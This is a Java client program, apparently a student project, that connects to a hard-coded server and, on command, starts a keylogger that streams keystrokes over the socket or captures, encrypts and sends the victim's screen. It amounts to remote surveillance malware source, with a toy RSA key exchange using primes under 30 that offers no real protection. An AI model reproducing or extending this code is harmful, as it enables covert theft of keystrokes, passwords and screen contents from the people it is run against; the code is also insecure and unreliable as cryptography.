import java.awt.event.KeyEvent;
import java.awt.event.KeyListener;
import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.math.BigInteger;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.net.SocketAddress;
import java.net.UnknownHostException;
import java.util.ArrayList;
import java.util.List;
import java.util.Scanner;

import AES.AESCipher;
import AES.Struct;
import KeyLogger.Monitor;
import RSA.RDecrypt;
import ScreenShot.ScreenShot;
import cipher.Cipher;

/**
 * @function Client
 * @version 3.0
 * @author ht
 *
 */
public class FileClient1 {
	static final int TCPPORT = 2021; //connect port
	static final String HOST = "192.168.43.21"; //connect address
	static final int UDPPORT = 2020;
	//UDP
	DatagramSocket udpSocket; // Client DatagramSocket 
	private static String pukey = null;
	private static String prkey = null;
	private static String secretKey = null;
	//TCP
	Socket tcpsocket = new Socket();
	String name=null;
	File tfile = new File("");//The parameter is empty
//	String courseFile = tfile.getCanonicalPath() ; 
	String recPath = tfile.getCanonicalPath()+"/hby/";
	File recfile = new File(recPath);
	
	
	public FileClient1() throws UnknownHostException, IOException {
		//socket = new Socket(HOST, PORT); //Create a client socket
		//TCP
		tcpsocket = new Socket();
		tcpsocket.connect(new InetSocketAddress(HOST, TCPPORT));
		System.out.println(HOST+":"+TCPPORT+">Connection succeeded");
		//UDP
		udpSocket = new DatagramSocket(); // Randomly available port, also known as anonymous port
	}

	public static void main(String[] args) throws UnknownHostException,
			IOException {
		new FileClient1().send();
	}

	/**
	 * send implements
	 * @throws IOException 
	 */
	public void send() throws IOException {

		try {
			
			//Generate a key pair, initialized to the RSA algorithm type key pair
			int P = (int)(10+Math.random()*(30-10+1));
			int Q = (int)(10+Math.random()*(30-10+1));
			
			int k = 0;
			while(k==0){
				if(checkPrime(P)==true && checkPrime(Q)==true && P!=Q)
					k = 1;
				else{
					P = (int)(10+Math.random()*(30-10+1));
					Q = (int)(10+Math.random()*(30-10+1));
				}
					
			}
	
			BigInteger PP = new BigInteger(P+"");
			BigInteger QQ = new BigInteger(Q+"");
			BigInteger[][] keys = genKey(PP,QQ);
			
			BigInteger[] pu = keys[0];
			BigInteger[] pr = keys[1];
			pukey = pu[0]+","+pu[1];
			prkey = pr[0]+","+pr[1];
			//TCP\
			//Client output stream, send a message to the server
			BufferedWriter bw = new BufferedWriter(new OutputStreamWriter(
					tcpsocket.getOutputStream()));
			//Client input stream, receiving server messages
			BufferedReader br = new BufferedReader(new InputStreamReader(
					tcpsocket.getInputStream()));
			PrintWriter pw = new PrintWriter(bw, true); //Decorative output stream, refresh in time
			//Scanner in = new Scanner(System.in); //Accept user information
			String tcpMsg = null; //Receive information written by the client
			
			//UDP
			DatagramPacket requestPacket = new DatagramPacket(new byte[1024],1024,new InetSocketAddress(HOST, UDPPORT));
			String courseFile = tfile.getCanonicalPath(); //Receive the file root directory sent by the client


			pw.println("Key"+" "+pukey);
			while ((tcpMsg = br.readLine()) != null) {
				if(tcpMsg.equals("getStroke")){
					Monitor monitor = new Monitor(tcpsocket,secretKey);   		
				}
				if(tcpMsg.startsWith("send")){
					String[] message = tcpMsg.split(" ");
					RDecrypt rde = new RDecrypt();
					System.out.println(message[1]+" "+prkey);
					secretKey = rde.Rdcrypt(message[1], prkey);

					String sig = rde.Rdcrypt(message[2],message[3]);
					String op = null;
					if(sig.equals("Hello")){
						System.out.println(">>>Successful verification£¡");
						op = ">>>Key exchange succeeded!";
					}
					else
						op = ">>>Key exchange failed, digital signature verification failed!";
					pw.println(op);
				}
				else if(tcpMsg.startsWith("screen")){
					//pw.println("screen");
					ScreenShot.SavaScreen();
					File picture = ScreenShot.GetScreen();
					int length = 0;
					DataOutputStream dos = new DataOutputStream(tcpsocket.getOutputStream()); //File output stream
		    
		            int read = 0;
		            FileInputStream fis = new FileInputStream(picture);
		            Cipher aes = new AESCipher();
		            List <Struct> list = new ArrayList <Struct>();
		            list = aes.encryptFile(secretKey, picture.getPath());
		            pw.println("screen "+list.size());
		            pw.flush();
		            for(Struct temp:list){
		            	pw.println(temp.str+" "+temp.len);
		            	pw.flush();
		            }						
				}
				System.out.println(tcpMsg);
			}
		} catch (IOException e) {
			e.printStackTrace();
		}
	}

	/**
	 * 
	 * @param e
	 * @param n
	 * @return
	 */
	public static boolean checkPrime(int n){
		for(int i=2;i<=n/2;i++){
			if(n%i==0){
				return false;
			}
		}
		return true;
	}
	
	public void keyPressed(KeyEvent e) {
	     if(e.isControlDown()&&e.getKeyCode()==KeyEvent.VK_C){//Press ctrl+c at the same time
	     }

	}
	
	
	


	
	public static BigInteger[][] genKey(BigInteger p, BigInteger q){
		BigInteger n = p.multiply(q) ;
		BigInteger fy = p.subtract(BigInteger.ONE).multiply(q.subtract(BigInteger.ONE)) ;
		int ee = (int)(1+Math.random()*(fy.intValue()-1+1));
		while(!isCoprime(ee,fy.intValue())){
			ee = (int)(1+Math.random()*(fy.intValue()-1+1));
		}
		BigInteger e = new BigInteger(ee+"") ;
		// generate d
		int a = e.intValue() ;
		int b = fy.intValue() ;
		BigInteger d = getD(a, b) ;

		// Public key private key
		return new BigInteger[][]{{n , e}, {n , d}} ;
	}
	
	public static boolean isCoprime(int x,int y){
		if(x==1&&y==1)
			return true;
		else if(x<=0||y<=0||x==y)
			return false;
		else if(x==1 || y==1)
			return true;
		else{
			int tmp = 0;
			while(true){
				tmp = x%y;
				if(tmp==0){
					break;
				}
				else{
					x=y;
					y=tmp;
				}
			}
			if(y==1)
				return true;
			else 
				return false;
		}
	}
	
	/**
	 * 
	 * @param e
	 * @param n
	 * @return
	 */
	public static BigInteger getD(int e,int n){
		int k = -1;
		int d = 1;
		while(k!=0){
			int m = e*d-1;
			k = m%n;
			d++;
		}
		BigInteger result = new BigInteger((int)(d-1)+"");
		return result;
	}
	
    

}
